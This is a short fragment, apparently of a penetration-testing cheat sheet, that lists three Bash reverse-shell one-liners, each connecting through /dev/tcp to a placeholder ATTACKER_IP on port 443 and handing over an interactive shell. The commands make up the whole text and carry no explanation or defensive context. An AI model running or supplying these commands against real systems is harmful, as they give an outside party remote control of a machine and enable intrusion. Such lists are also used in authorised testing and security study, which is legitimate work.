...
**Bash**
    ...
    eg. bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
    ...
    eg. exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
    ...
    eg. 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
